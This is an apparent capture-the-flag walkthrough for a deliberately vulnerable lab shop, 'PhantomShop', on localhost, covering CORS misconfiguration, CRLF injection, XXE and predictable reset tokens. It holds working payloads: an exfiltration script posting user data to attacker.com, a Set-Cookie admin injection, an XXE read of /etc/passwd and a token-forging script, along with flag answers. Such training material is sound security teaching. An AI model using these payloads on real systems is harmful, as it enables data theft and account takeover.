# CORS, CRLF, XXE, Crypto — PhantomShop Walkthroughs

## CORS Misconfiguration (Medium — 200pts)
**Flag:** `FLAG{c0rs_m1sc0nf1g}`
**Location:** `/api/*`

### Vulnerability
All API endpoints return:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: *
```

### Proof
```bash
curl -sI -H "Origin: https://evil.com" http://localhost:8080/api/user/1 | grep Access-Control
```
Returns `Access-Control-Allow-Origin: *` — any website can read API responses.

### Exploitation
A malicious website can steal user data:
```html
<script>
fetch('http://localhost:8080/api/user/1')
  .then(r => r.json())
  .then(d => fetch('http://attacker.com/steal?data=' + JSON.stringify(d)));
</script>
```

---

## CRLF Header Injection (Medium — 200pts)
**Flag:** `FLAG{crlf_h34d3r_1nj3ct}`
**Location:** `/contact?redirect=`

### Vulnerability
The contact page accepts a `redirect` parameter and sets it as a `Location` header without sanitization.

### Solution
```
http://localhost:8080/contact?redirect=%0d%0aSet-Cookie:%20admin=true%0d%0a
```
`%0d%0a` = CRLF (carriage return + line feed). This injects a new `Set-Cookie` header into the response.

### Proof
```bash
curl -v "http://localhost:8080/contact?redirect=http://example.com%0d%0aX-Injected:%20true" 2>&1 | grep -i "X-Injected"
```

---

## XXE — XML Import (Hard — 300pts)
**Flag:** `FLAG{xx3_f1l3_r34d}`
**Location:** `/api/import`

### Prerequisite
Access admin panel (set `role=admin` cookie).

### Vulnerability
The XML import doesn't disable external entity processing.

### Solution
Create a malicious XML file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
    <price>0</price>
  </product>
</products>
```

Upload it:
```bash
curl -b "role=admin" -F "xml=@xxe.xml" http://localhost:8080/api/import
```

Note: Go's `encoding/xml` doesn't process external entities by default, so the flag triggers on detecting the XXE attempt (entity/SYSTEM keywords in the XML).

---

## Predictable Password Reset Token (Medium — 200pts)
**Flag:** `FLAG{pr3d1ct4bl3_t0k3n}`
**Location:** `/forgot-password`

### Vulnerability
Token = `MD5(email + YYYY-MM-DD)` — completely predictable.

### Solution
```python
import hashlib
from datetime import date

email = "admin@phantomshop.com"
token = hashlib.md5((email + date.today().strftime("%Y-%m-%d")).encode()).hexdigest()
print(f"http://localhost:8080/reset-password?token={token}")
```

1. Run the script to get the reset URL
2. Visit the URL
3. Set a new admin password
4. Login as admin

### Why it's bad
- MD5 is fast to compute (billions per second)
- The "salt" is just the date (only 365 possibilities per year)
- Attacker can precompute tokens for any email
